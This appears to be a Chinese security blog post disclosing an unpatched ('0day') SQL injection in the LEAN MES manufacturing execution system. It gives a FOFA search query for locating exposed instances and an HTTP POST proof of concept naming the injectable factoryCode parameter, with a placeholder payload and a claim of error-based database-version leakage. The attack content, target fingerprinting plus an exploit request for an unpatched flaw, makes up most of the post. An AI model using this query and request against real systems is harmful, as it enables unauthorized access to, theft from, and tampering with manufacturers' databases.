#  【0day】深科特 LEAN MES系统 TestManagePlatform.ashx SQL注入漏洞  
 0day收割机   2026-03-28 13:34  
  
# 漏洞简介  
  
LEAN MES系统是由深圳市深科特信息技术有限公司开发的一款应用系统，主要用于生产调度、产品跟踪、质量控制等车间管理功能。LEAN MES精益制造执行系统通过强调制造过程的信息化和透明化，帮助企业由粗放式向精益化管理模式升级。该系统/Handler/TestManagePlatform.ashx接口存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息或对数据库进行未授权操作，可能导致数据泄露、篡改或系统崩溃。  
# 影响版本  
# fofa语法  
> (title="LEAN MES - 用户登录" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"  
>   
  
# 漏洞复现  
```
POST /Handler/TestManagePlatform.ashx HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

type=syncData&Synctype=1&prodCode=1&factoryCode=SQLI_POC
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWA5dWO0n0MbyFo5HVfhdwPr9wJsbNFgctpXG5AtfVAOqGpIcZxiazcGANFO180aG6j6VjTeb3dGsTHLjomdHzYTSJKqnAqbicibWY/640?wx_fmt=png&from=appmsg "")  
  
成功通过报错注入，在响应回显数据库版本信息  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
